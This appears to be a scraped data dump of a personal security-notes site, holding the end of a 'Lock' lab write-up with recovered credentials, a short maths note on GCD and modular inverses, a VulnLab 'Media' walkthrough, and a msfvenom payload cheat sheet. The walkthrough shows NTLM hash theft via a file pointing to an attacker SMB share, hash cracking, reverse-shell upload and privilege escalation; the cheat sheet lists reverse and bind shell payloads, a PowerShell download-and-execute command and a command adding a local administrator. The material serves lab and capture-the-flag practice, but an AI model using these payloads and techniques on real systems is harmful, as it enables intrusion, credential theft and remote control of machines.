class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritIcon\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritPanel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritPassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritPort\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritProtocol\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritPuttySession\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRedirectDiskDrives\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRedirectKeys\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRedirectPorts\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRedirectPrinters\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRedirectSmartCards\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRedirectSound\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritSoundQuality\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritResolution\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritAutomaticResize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritUseConsoleSession\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritUseCredSsp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRenderingEngine\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritICAEncryptionStrength\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRDPAuthenticationLevel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRDPMinutesToIdleTimeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRDPAlertIdleTimeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritLoadBalanceInfo\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritPreExtApp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritPostExtApp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritMacAddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritUserField\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritExtApp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCCompression\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCEncoding\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCAuthMode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCProxyType\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCProxyIP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCProxyPort\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCProxyUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCProxyPassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCColors\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCSmartSizeMode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritVNCViewOnly\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRDGatewayUsageMethod\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRDGatewayHostname\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRDGatewayUseConnectionCredentials\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRDGatewayUsername\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRDGatewayPassword\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eInheritRDGatewayDomain\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/mrng:Connections\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eMore Creds :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003etype\u003c/span\u003e .git-credentials\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDecrypt :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eJul 26, \u003cspan class=\"m\"\u003e2024\u003c/span\u003e - 17:22:39 \u003cspan class=\"o\"\u003e(\u003c/span\u003eCEST\u003cspan class=\"o\"\u003e)]\u003c/span\u003e exegol-Algo /workspace \u003cspan class=\"c1\"\u003e# python3 exploit.py config.xml\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName: RDP/Gale\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHostname: Lock\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUsername: Gale.Dekarios\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePassword: ty8wnW9qCKDosXo6\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eTool : https://github.com/gquere/mRemoteNG_password_decrypt/blob/master/mremoteng_decrypt.py\u003c/p\u003e","tags":[],"title":"Lock"},{"content":"","date":"2023-09-07","id":71,"permalink":"/notes/code/lua/","summary":"","tags":[],"title":"Lua"},{"content":"The Greatest Common Divisor (GCD) The Greatest Common Divisor (GCD), sometimes referred to as the highest common factor, is the largest number that divides two positive integers (a, b).\nCalculation of GCD To calculate the GCD of two numbers, various methods can be employed, such as the method of successive subtraction, the method of Euclidean division, or Euclid\u0026rsquo;s algorithm. In this example, we will use the method of divisors.\nExample 1: Consider a = 12 and b = 8. The divisors of a are {1, 2, 3, 4, 6, 12}, and the divisors of b are {1, 2, 4, 8}. By comparing these two sets, we find that gcd(a, b) = 4.\nExample 2: Now, let\u0026rsquo;s take a = 11 and b = 17. Both a and b are prime numbers. As a prime number has only itself and 1 as divisors, gcd(a, b) = 1.\nCoprime Integers We say that for any two integers a, b, if gcd(a, b) = 1, then a and b are coprime integers. This implies that they have no common divisors other than 1.\nSpecial Cases: If both a and b are prime, then they are automatically coprime.\nIf a is prime and b \u0026lt; a, then a and b are coprime.\nIf a is prime and b \u0026gt; a, a and b are not necessarily coprime.\nExplanation for the Third Case: If a is a prime number, and b is greater than a, there might be a common divisor greater than 1. Since a is prime, its only divisors are 1 and itself. However, b could have divisors that are common with a, and these divisors would not be 1.\nFor instance, consider a = 5 and b = 10. Although 5 is prime, there is a common divisor, namely 5. Therefore, in this case, a and b are not coprime.\nIn summary, coprimality between a and b is ensured only when gcd(a, b) = 1. While certain specific cases, such as when the numbers are prime or when one is smaller than the other, guarantee coprimality, it is not guaranteed when a is prime and b is greater than a.\nExtended GCD : Here is how it works :\na = 26513 b = 32321 u = 1 u1 = 0 v = 0 v1 = 1 q = a // b r = a % b def eu(x, y): global u, u1, v, v1, a, b, q, r # Utilisez le mot-clé global pour accéd\u0026gt; while r != 0: u, u1 = u1, u - q * u1 v, v1 = v1, v - q * v1 a, b = b, r q = a // b r = a % b print(u1,v1) eu(a, b)\rModular Inverse:\nIn modular arithmetic, the modular inverse, or multiplicative inverse modulo mm, of an integer aa is another integer xx such that the product a×xa×x is congruent to 1 modulo mm. It is denoted as a−1(modm)a−1(modm). Formally, this can be expressed as:\na×x≡1(modm)a×x≡1(modm)\nIf such an integer xx exists, then aa is said to have a modular inverse modulo mm, and this inverse is unique modulo mm. If no such integer xx exists, then aa does not have a modular inverse modulo mm.\nExistence of Modular Inverse:\nThe modular inverse exists if and only if aa is coprime (relatively prime) to mm, meaning that aa and mm have no common factors other than 1.\nCalculating Modular Inverse:\nTo calculate the modular inverse of aa modulo mm, one can use the extended Euclidean algorithm. This algorithm finds Bézout coefficients xx and yy such that ax+my=gcd(a,m)ax+my=gcd(a,m), where gcdgcd is the greatest common divisor.\nIf gcd(a,m)=1gcd(a,m)=1, then xx is the desired modular inverse, and we can take x(modm)x(modm) as the solution.\nExample:\nLet\u0026rsquo;s find the modular inverse of a=3a=3 modulo m=11m=11. Using the extended Euclidean algorithm, we find Bézout coefficients:\n3×4+11×(−1)=13×4+11×(−1)=1\nThis gives x=4x=4, so the modular inverse of 3 modulo 11 is 3−1≡4(mod11)3−1≡4(mod11).\nThe modular inverse is a crucial concept in cryptography and number theory, used in algorithms such as the RSA encryption algorithm.\n","date":"2023-09-07","id":72,"permalink":"/notes/crypto/maths/","summary":"\u003ch2 id=\"the-greatest-common-divisor-gcd\"\u003eThe Greatest Common Divisor (GCD)\u003c/h2\u003e\n\u003cp\u003eThe Greatest Common Divisor (GCD), sometimes referred to as the highest common factor, is the largest number that divides two positive integers (a, b).\u003c/p\u003e","tags":[],"title":"Maths"},{"content":"Scan :\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0) | ssh-hostkey: | 3072 0bb3c0804088e1aeaa3b5ff4c223c00d (RSA) | 256 e0803fddb1f8fc83f5ded5b32d5a4b39 (ECDSA) |_ 256 b532c07218100f245df8e1ce2a735c1f (ED25519) 80/tcp open http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17) |_http-title: ProMotion Studio |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: MEDIA | NetBIOS_Domain_Name: MEDIA | NetBIOS_Computer_Name: MEDIA | DNS_Domain_Name: MEDIA | DNS_Computer_Name: MEDIA | Product_Version: 10.0.20348 |_ System_Time: 2024-08-13T11:56:05+00:00 |_ssl-date: 2024-08-13T11:56:10+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=MEDIA | Not valid before: 2024-08-12T11:52:32 |_Not valid after: 2025-02-11T11:52:32 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\rhttps://github.com/Greenwolf/ntlm_theft\nfile.wax file://\\\\10.8.3.12/steal/file https://10.8.3.12/test\r[SMB] NTLMv2-SSP Client : 10.10.114.247 [SMB] NTLMv2-SSP Username : MEDIA\\enox [SMB] NTLMv2-SSP Hash : enox::MEDIA:1122334455667788:8DF25B422AD85B0D448DB8B65EAE99B3:0101000000000000003F99758DEDDA014CA7DAE9C36B01A50000000002000800560033003900300001001E00570049004E002D0051005600590046004C0031004400310057004D00500004003400570049004E002D0051005600590046004C0031004400310057004D0050002E0056003300390030002E004C004F00430041004C000300140056003300390030002E004C004F00430041004C000500140056003300390030002E004C004F00430041004C0007000800003F99758DEDDA01060004000200000008003000300000000000000000000000003000002D3403DF02D837178C41B59BF2A1C77175AD08C49FAB9B24B67C94C4252485D50A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0033002E00310032000000000000000000 john --wordlist=/usr/share/wordlists/rockyou.txt hash enox: 1234virus@\rUser : VL{28ec1c0c64abcc790954f27429fbf5ff}\nhttps://github.com/itm4n/FullPowers\nCreate a jonction upload folder to website folder : #We read the source code to dertermine where waht is the name of the upload folder. mklink /J \u0026#34;C:\\foldername\u0026#34; \u0026#34;C:\\xampp\\htdocs\u0026#34;\rThen upload a reverse shell via the website\nEnable privilege like impersonate : whoami --\u0026gt; NT AUTHORITY / LOCAL SERVICE FullPower.exe # enableSeimpersonate\rroot VL{dc7871a771551174176b0cc7af8ad3bd}\n","date":"2023-09-07","id":73,"permalink":"/notes/lab/vulnlab/media/","summary":"\u003cp\u003eScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp   open  ssh           OpenSSH for_Windows_8.1 \u003cspan class=\"o\"\u003e(\u003c/span\u003eprotocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e3072\u003c/span\u003e 0bb3c0804088e1aeaa3b5ff4c223c00d \u003cspan class=\"o\"\u003e(\u003c/span\u003eRSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e e0803fddb1f8fc83f5ded5b32d5a4b39 \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e b532c07218100f245df8e1ce2a735c1f \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp   open  http          Apache httpd 2.4.56 \u003cspan class=\"o\"\u003e((\u003c/span\u003eWin64\u003cspan class=\"o\"\u003e)\u003c/span\u003e OpenSSL/1.1.1t PHP/8.1.17\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: ProMotion Studio\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Apache/2.4.56 \u003cspan class=\"o\"\u003e(\u003c/span\u003eWin64\u003cspan class=\"o\"\u003e)\u003c/span\u003e OpenSSL/1.1.1t PHP/8.1.17\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: MEDIA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: MEDIA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: MEDIA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: MEDIA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: MEDIA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-08-13T11:56:05+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-13T11:56:10+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eMEDIA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-12T11:52:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-02-11T11:52:32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003ehttps://github.com/Greenwolf/ntlm_theft\u003c/p\u003e","tags":[],"title":"Media"},{"content":"Windows Reverse Shell meterpreter\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.18 LPORT=5050 -f exe \u0026gt; reverse.exe\rBind Shell\nmsfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe \u0026gt; bind.exe\rCMD Shell\nmsfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe \u0026gt; prompt.exe\rExecute Command\nmsfvenom -a x86 --platform Windows -p windows/exec CMD=\u0026#34;powershell \\\u0026#34;IEX(New-Object Net.webClient).downloadString(\u0026#39;http://IP/nishang.ps1\u0026#39;)\\\u0026#34;\u0026#34; -f exe \u0026gt; pay.exe msfvenom -a x86 --platform Windows -p windows/exec CMD=\u0026#34;net localgroup administrators shaun /add\u0026#34; -f exe \u0026gt; pay.exe\rDLL :\nmsfvenom -f dll -p windows/exec CMD=\u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; -o srrstr.dll\rmsfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.167 LPORT=4242 -f dll \u0026gt; shell.dll\rmsfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=10.8.0.173 LPORT=9001 \u0026gt; hostfxr.dll\rEmbedded inside executable\nmsfvenom -p windows/shell_reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=\u0026lt;PORT\u0026gt; -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe\rLinux Payloads Reverse Shell\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf \u0026gt; reverse.elf msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf \u0026gt; shell.elf\rBind Shell\nmsfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf \u0026gt; bind.elf\rMAC Payloads Reverse Shell:\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho \u0026gt; reverse.macho\rBind Shell\nmsfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho \u0026gt; bind.macho\rWeb Based Payloads PHP\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=\u0026lt;IP\u0026gt; LPORT=\u0026lt;PORT\u0026gt; -f raw \u0026gt; shell.php cat shell.php | pbcopy \u0026amp;\u0026amp; echo \u0026#39;\u0026lt;?php \u0026#39; | tr -d \u0026#39;\\n\u0026#39; \u0026gt; shell.php \u0026amp;\u0026amp; pbpaste \u0026gt;\u0026gt; shell.php\rASP/x\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp \u0026gt;reverse.asp\rmsfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx \u0026gt;reverse.aspx\rJSP\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw\u0026gt; reverse.jsp\rWAR\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war \u0026gt; reverse.war\rNodeJS\nmsfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)\rScript Language payloads Perl\nmsfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw \u0026gt; reverse.pl\rPython\nmsfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw \u0026gt; reverse.py\rBash\nmsfvenom -p cmd/unix/reverse_bash LHOST=\u0026lt;Local IP Address\u0026gt; 